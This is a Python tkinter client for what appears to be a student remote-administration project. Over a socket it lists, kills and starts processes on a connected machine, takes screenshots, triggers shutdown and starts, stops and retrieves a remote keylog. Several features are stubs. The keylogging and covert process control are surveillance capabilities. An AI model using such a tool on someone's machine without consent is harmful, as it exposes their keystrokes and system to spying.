from tkinter import *
import tkinter.messagebox as mbox 
from tkinter import ttk
import tkinter as tk
import socket
import threading
from PIL import Image
import numpy as np
HEADER = 64
PORT = 5050
FORMAT = 'utf-8'
#SERVER = socket.gethostbyname(socket.gethostname())
SERVER = "127.0.0.1"
ADDR = (SERVER,PORT)
DISCONNECT_MESSAGE = "DISCONNECT!"
TAKE_SCREEN_SHOT = "TAKE SCREENSHOT"
RUNNING_PROCESS ="CHECK RUNNING PROCESS"
STOP_LISTING = "STOP"
START_LISTING = "START LISTING"

KILL_PROCESS_VIA_PID = "KILL PROCESS VIA PID"
KILL_PROCESS_VIA_NAME = "KILL PROCESS VIA NAME"
KEYLOGGING ="KEY LOG"
STOP_KEYLOGGING = "STOP KEYLOGGING"
PRINT_KEYLOG = "PRINT KEYLOG"
SHUTDOWN = "SHUTDOWN"
CANCEL_SHUTDOWN = "CANCEL SHUTDOWN"
SEND_FILE = "SEND FILE"
SEND_REG_FILE = "SEND REG FILE"
CREATE_REG_KEY = "CREATE REG KEY"
GET_KEY_VALUE = "GET KEY VALUE"
ADD_NEW_KEY = "ADD NEW KEY"
DEL_KEY = "DELETE KEY"
START_PROCESS = "START PROCESS"



client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# client.connect(ADDR)

def send(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)

    #print(client.recv(1024).decode(FORMAT))

def send1(conn,msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    conn.send(send_length)
    conn.send(message)

def recv1(conn):
    msg_length = conn.recv(HEADER).decode(FORMAT)
    if msg_length:
        msg_length = int(msg_length)
        msg = conn.recv(msg_length).decode(FORMAT)
        return msg
    return ""

def get_Size(fileobject):
    fileobject.seek(0,2) # move the cursor to the end of the file
    size = fileobject.tell()
    return size

def send_file(conn, filename):
    file = open(filename,"rb")
    size = get_Size(file)
    size = str(size)
    file.close()
    # conn.send(size.encode(FORMAT))
    send1(conn,size)

    with open(filename, "rb") as fp:
        data = fp.read(1024)
        while data:
            conn.send(data)
            data = fp.read(1024)
            if not data:
                break


def recv_file(conn, filename):
    size = recv1(conn)
    size = int(size)
    i = 0
    with open(filename,"wb") as file:
        while True:
            i +=1024
            byte_read = 1024
            
            data = conn.recv(byte_read)
            file.write(data)
            if i > size:
                break
            if size - i < 1024:
                byte_read = size - i



def send_img(conn,filename):
    im = Image.open(filename,'r')
    width,height = im.size
    pic_data = list(im.getdata())
    send1(conn,str(width))
    send1(conn,str(height))
    len =width*height
    for i in range(len):
        send1(conn,str(pic_data[i][0]))
        send1(conn,str(pic_data[i][1]))            
        send1(conn,str(pic_data[i][2]))            


    

def recv_img(conn,filename):
    width = recv1(conn)
    height = recv1(conn)
    width = int(width)
    height = int(height)
    pixels = list()
    for i in range(height):
        tmp = list()
        for j in range(width):
            r = int(recv1(conn))
            g = int(recv1(conn))
            b = int(recv1(conn))
            pxl =(r,g,b)
            tmp.append(pxl)
        pixels.append(tmp)
    array = np.array(pixels, dtype=np.uint8)
    new_img = Image.fromarray(array)
    new_img.save(filename)







TITLE = "Client "






 #ProcessRunning------------------------------------------------------------------------------------------

def doProcessRunning(event):

    proc_name_l, pid_l, thread_cnt_l = [], [], []
    count = 0

    def KILL_PR(event):


        def KILL_PR_EXECUTE(event):
            send(KILL_PROCESS_VIA_PID)
            kill_this_pid = entry.get()
            # client.send(str(kill_this_pid).encode(FORMAT))
            send1(client,str(kill_this_pid))
            # succeed = client.recv(1024).decode(FORMAT)
            succeed = recv1(client)
            if succeed == "TRUE":
                
                mbox.showinfo(None,"Operation compeleted")
            else:
                mbox.showinfo(None,"Process not found")

        RootPR_KILL = Toplevel(RootPR)
        RootPR_KILL.title(40*" "+"KILL")
        RootPR_KILL.geometry("400x50")
        RootPR_KILL.resizable(0, 0)
        RootPR_KILL.grab_set()

        entry = Entry(RootPR_KILL, width = 40)
        buttonPR_KILL_InSide = Button(RootPR_KILL, text = "KILL",width=10, height = 1)
        buttonPR_KILL_InSide.bind("<Button-1>", KILL_PR_EXECUTE)


        entry.place(x = 20, y = 15)
        buttonPR_KILL_InSide.place(x = 280, y = 15)

        
        
    
    def SHOW_PR(event):
        send(RUNNING_PROCESS)
        
        proc_name_l.clear()
        pid_l.clear()
        thread_cnt_l.clear()
        count = 0
        while True:
            # data = client.recv(1024).decode(FORMAT)
            data = recv1(client)
            if data[:4] == STOP_LISTING:
                num  = [int(i) for i in data.split() if i.isdigit()]
                count = num[0]
                break
            split_data = data.split('\t')
            proc_name_l.append(split_data[0])
            pid_l.append(split_data[1])
            thread_cnt_l.append(split_data[2])
        
        for id in range(count):
            tree.insert('', 'end', iid= id, text="" , values=(proc_name_l[id],pid_l[id],thread_cnt_l[id]))
            
        
        

        # print("SHOW")

    def DELETE_PR(event):
        for i in tree.get_children():
            tree.delete(i)
        

    def START_PR(event):
        def START_PR_EXECUTE(event):
            send(START_PROCESS)
            proc = entry.get()
            send1(client, proc)
            

        RootPR_START = Toplevel(RootPR)

        RootPR_START.title(40*" "+"START")
        RootPR_START.geometry("400x50")
        RootPR_START.resizable(0, 0)
        RootPR_START.grab_set()
        
        entry = Entry(RootPR_START, width = 40)
        buttonPR_START_InSide = Button(RootPR_START, text = "START",width=10, height = 1)
        buttonPR_START_InSide.bind("<Button-1>",START_PR_EXECUTE)

        entry.place(x = 20, y = 15)
        buttonPR_START_InSide.place(x = 280, y = 15)

    #------------------------------------------------------
    RootPR = Toplevel(Client_windows)
    RootPR.title(55*" "+"Process")
    RootPR.grab_set()

    RootPR.geometry("500x350")
    
    #KILL
    buttonPR_KILL = Button(RootPR, text = 'KILL',padx =33, pady=20)
    buttonPR_KILL.bind("<Button-1>", KILL_PR)
    buttonPR_KILL.place(x =38, y =15)

    #SHOW
    buttonPR_SHOW = Button(RootPR, text = 'SHOW',padx =28, pady=20)
    buttonPR_SHOW.bind("<Button-1>", SHOW_PR)
    buttonPR_SHOW.place(x =140, y =15)

    #DELETE
    buttonPR_SHOW = Button(RootPR, text = 'DELETE',padx =27, pady=20)
    buttonPR_SHOW.bind("<Button-1>", DELETE_PR)
    buttonPR_SHOW.place(x =245, y =15)

    #Start
    buttonPR_SHOW = Button(RootPR, text = 'START',padx =33, pady=20)
    buttonPR_SHOW.bind("<Button-1>", START_PR)
    buttonPR_SHOW.place(x =350, y =15)

    #Table
    tree =ttk.Treeview(RootPR, column=("c1", "c2", "c3"), show='headings')
    vsb = ttk.Scrollbar(RootPR, orient="vertical", command=tree.yview)
    
    tree.bind('<Button-1>', "break")
   
    tree.column("#1", anchor=tk.CENTER, minwidth=0, width=190, stretch= FALSE)
    tree.heading("#1", text="Name Process")
    tree.column("#2", anchor=tk.CENTER, minwidth=0, width=109 ,stretch=FALSE)
    tree.heading("#2", text="ID Process")
    tree.column("#3", anchor=tk.CENTER, minwidth=0, width=109, stretch=FALSE)
    tree.heading("#3", text="Count Thread")
    tree.place(x = 38, y = 100)
    vsb.place(x=38+190+109+109, y=100, height=227)

#APPRunning-----------------------------------------------------------------------------------------------

def doAPPRunning(event):

    def KILL_AR(event):
        RootAR_KILL = Toplevel(RootAR)
        RootAR_KILL.title(40*" "+"KILL")
        RootAR_KILL.geometry("400x50")
        RootAR_KILL.resizable(0, 0)
        RootAR_KILL.grab_set()

        entry = Entry(RootAR_KILL, width = 40)
        buttonAR_KILL_InSide = Button(RootAR_KILL, text = "KILL",width=10, height = 1)

        entry.place(x = 20, y = 15)
        buttonAR_KILL_InSide.place(x = 280, y = 15)

    def SHOW_AR(event):
        print("SHOW")

    def DELETE_AR(event):
        print("DELETE")

    def START_AR(event):
        RootAR_START = Toplevel(RootAR)
        RootAR_START.title(40*" "+"START")
        RootAR_START.geometry("400x50")
        RootAR_START.resizable(0, 0)
        RootAR_START.grab_set()

        entry = Entry(RootAR_START, width = 40)
        buttonAR_START_InSide = Button(RootAR_START, text = "START",width=10, height = 1)

        entry.place(x = 20, y = 15)
        buttonAR_START_InSide.place(x = 280, y = 15)

    #--------------------------------------------
    RootAR = Toplevel(Client_windows)
    RootAR.title(55*" "+"ListApp")
    RootAR.grab_set()
    RootAR.geometry("500x350")
    #KILL
    buttonAR_KILL = Button(RootAR, text = 'KILL',padx =33, pady=20)
    buttonAR_KILL.bind("<Button-1>", KILL_AR)
    buttonAR_KILL.place(x =38, y =15)
    #SHOW
    buttonPR_SHOW = Button(RootAR, text = 'SHOW',padx =28, pady=20)
    buttonPR_SHOW.bind("<Button-1>", SHOW_AR)
    buttonPR_SHOW.place(x =140, y =15)
    #DELETE
    buttonPR_SHOW = Button(RootAR, text = 'DELETE',padx =27, pady=20)
    buttonPR_SHOW.bind("<Button-1>", DELETE_AR)
    buttonPR_SHOW.place(x =245, y =15)
    #Start
    buttonPR_SHOW = Button(RootAR, text = 'START',padx =33, pady=20)
    buttonPR_SHOW.bind("<Button-1>", START_AR)
    buttonPR_SHOW.place(x =350, y =15)
    #Table
    tree =ttk.Treeview(RootAR, column=("c1", "c2", "c3"), show='headings')
    vsb = ttk.Scrollbar(RootAR, orient="vertical", command=tree.yview)
    
    tree.bind('<Button-1>', "break")
   
    tree.column("#1", anchor=tk.CENTER, minwidth=0, width=190, stretch= FALSE)
    tree.heading("#1", text="Name Application")
    tree.column("#2", anchor=tk.CENTER, minwidth=0, width=109 ,stretch=FALSE)
    tree.heading("#2", text="ID Application")
    tree.column("#3", anchor=tk.CENTER, minwidth=0, width=109, stretch=FALSE)
    tree.heading("#3", text="Count Thread")
    tree.place(x = 38, y = 100)
    vsb.place(x=38+190+109+109, y=100, height=227)

#KEYSTROKE------------------------------------------------------------------------------------------------


hooked = False

def doKEYSTROKE():
    
    def HOOK():
        global hooked
        hooked=True
        send1(client,KEYLOGGING)
        
    def A():
        threading.Thread(target=HOOK).start()



    def UNLOCK():  
        global hooked
        hooked = False
        send1(client,STOP_KEYLOGGING)

    def B():
       threading.Thread(target=UNLOCK).start()



    def PRINT():
        global hooked
        if hooked ==True:
            send1(client,PRINT_KEYLOG)
            key_log_string = recv1(client)
            if key_log_string == "File not found":
                mbox.showinfo(None,"Keystroke is not hooked!")
            else:
                text.insert('end',key_log_string)
                # A()
        else:
            mbox.showinfo(None,"Keystroke is not hooked!")

    def C():
        threading.Thread(target=PRINT).start()
    def DELETE():
        text.delete(1.0,'end')
    def D():
        threading.Thread(target=DELETE).start()

    #-----------------------------------------------------------------------------------    

    RootK = Toplevel(Client_windows)
    RootK.title(55*" "+"Keystroke")
    RootK.grab_set()
    RootK.geometry("500x350")
    
    #HOOK
    buttonK_HOOK = Button(RootK, text = 'HOOK',padx =33, pady=20, command=A)
    # buttonK_HOOK.bind("<Button-1>", HOOK)
    buttonK_HOOK.place(x =38, y =15)

    #UNLOCK
    buttonK_UNLOCK = Button(RootK, text = 'UNLOCK',padx =33, pady=20, command= B)
    # buttonK_UNLOCK.bind("<Button-1>", UNLOCK)
    buttonK_UNLOCK.place(x =140, y =15)

    #PRINT
    buttonK_PRINT = Button(RootK, text = 'PRINT',padx =33, pady=20, command= C)
    # buttonK_PRINT.bind("<Button-1>", PRINT)
    buttonK_PRINT.place(x =245, y =15)

    #DELETE
    buttonK_DELETE = Button(RootK, text = 'DELETE',padx =33, pady=20, command=D)
    # buttonK_DELETE.bind("<Button-1>", DELETE)
    buttonK_DELETE.place(x =350, y =15)
  
    #TABLE
    text = Text(RootK)
    text.place(x = 38, y = 90, width = 425, height = 230)
    # text.insert('end', '.....')         
    # text.configure(state='disabled')

#FixRegistry----------------------------------------------------------------------------
def doFixRegistry(event):
    def doBrower(event):
        pass
    def doSendMessenger(event):
        pass
    def Send(event):
        pass
    def Delete(event):
        pass
    def SelectFunction(event):
        def GetValue():
            print("get")
        def SetValue():
            print("Set")
        def DltValue():
            print("Dlt")
        def CreateKey():    
            print("CK")
        def DltKey():
            print("DltK")
        def Select(x):
            switch = {        
                " Get value": GetValue(),
                " Set value": SetValue(),
                " Delete value": DltValue(),
                " Create key": CreateKey(),
                " Delete key": DltKey(),
            }
            return switch.get(x)
        
        Select(FunctionChoosen.get())

       # ' Get value','  value',' Delete value',' Create key', ' Delete key'


    RootFR = Toplevel(Client_windows)
    RootFR.title(55*" "+"Fix Keystroke")
    RootFR.grab_set()
    RootFR.geometry("500x450")

    #Brower---------------
    LinkEntry = Entry(RootFR)
    LinkEntry.place(x = 10, y = 10, width = 370)
    LinkEntry.insert('end', 'Link...')

    Button_Brower = Button(RootFR, text = "Brower")
    Button_Brower.place(x = 390, y = 10, width = 100)
    Button_Brower.bind("<Button-1>", doBrower)

    #SendMessage-----------
    textBox = Text(RootFR)
    textBox.place(x = 10, y = 40, width = 370, height = 100)
    textBox.insert('end', "Message")
    
    Button_SendMessage = Button(RootFR, text = "Send Message")
    Button_SendMessage.place(x = 390, y = 40, width = 100, height = 100)
    Button_SendMessage.bind("<Button-1>", doSendMessenger)

    #Fix------------------
    Label_Fix = Label(RootFR, text  = "Fix Value " + 85*'-')
    Label_Fix.place(x = 10, y = 145)

    #Combobox
    FunctionChoosen = ttk.Combobox(RootFR,state="readonly")
    FunctionChoosen.set("Select function") 
    FunctionChoosen['values'] = (' Get value',' Set value',' Delete value',' Create key', ' Delete key')
    FunctionChoosen.place(x = 10, y =165, width = 477)
    FunctionChoosen.bind('<<ComboboxSelected>>', SelectFunction)

    RootFR.mainloop()
    #Link
    LinkEntry_2 = Entry(RootFR)
    LinkEntry_2.place(x = 10, y = 193, width = 477)
    LinkEntry_2.insert('end', 'Link')

# CONNECT TO SERVER------------------------------------------------
def connect(event):
    IP_server = InputField.get()
    address = (IP_server,PORT)
    try:
        # client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client.connect(address)
    except Exception:
        print(Exception)
        mbox.showinfo(None,"Server not found.")

# EXIT == DISCONNECT FROM SERVER------------------------------------
def exit(event): 
    try:
        send(DISCONNECT_MESSAGE)
    except Exception as e:
        print(e)
    Client_windows.destroy()

# Take screenshot
def doTakeScreenshot(event):
    send(TAKE_SCREEN_SHOT)
    # recv_file(client,"ScreenShotFromServer.png")
    recv_img(client,"ScreenShotFromServer.png")
    pass

# Shutdown

def doShutDown(event):
    send(SHUTDOWN)
        







#INIT WINDOW
Client_windows = Tk()
Client_windows.title(80*" "+TITLE)
Client_windows.geometry("600x400")

#Create buttons
InputField = Entry(Client_windows,width = 50)
InputField.place(x = 100,y=50)


Connect_button = Button(Client_windows,text = "Connect",padx =25, pady=1)
Connect_button.bind("<Button-1>", connect)
Connect_button.place(x = 440, y = 50)

ProcessRunning_button = Button(Client_windows, text = "Process Running", padx = 10, pady = 120)
ProcessRunning_button.bind("<Button-1>", doProcessRunning)
ProcessRunning_button.place(x =54, y =100)

AppRunning_button = Button(Client_windows, text = "App Running", padx = 80, pady = 30)
AppRunning_button.bind("<Button-1>", doAPPRunning)
AppRunning_button.place(x =184, y =100)

Shutdown_button =  Button(Client_windows, text = "Shutdown", padx = 20, pady = 23)
Shutdown_button.bind("<Button-1>",doShutDown)
Shutdown_button.place(x =184, y =200)

ScreenShot_button =  Button(Client_windows, text = "PrintScreen", padx = 31, pady = 23)
ScreenShot_button.bind("<Button-1>",doTakeScreenshot)
ScreenShot_button.place(x =289, y =200)

Keystroke_button = Button(Client_windows, text = "Keystroke", padx =25, pady =53, command= doKEYSTROKE)
# Keystroke_button.bind("<Button-1>", doKEYSTROKE)
Keystroke_button.place(x = 437, y = 100)

RegistryOverwrite_button = Button(Client_windows, text = "Fix Registry", padx = 82, pady = 30)
RegistryOverwrite_button.bind("<Button-1>", doFixRegistry)
RegistryOverwrite_button.place(x = 184, y = 279)

Exit_button = Button(Client_windows, text="Exit", padx =40, pady = 47)
Exit_button.bind("<Button-1>", exit)
Exit_button.place(x = 437, y =245)

Client_windows.mainloop()

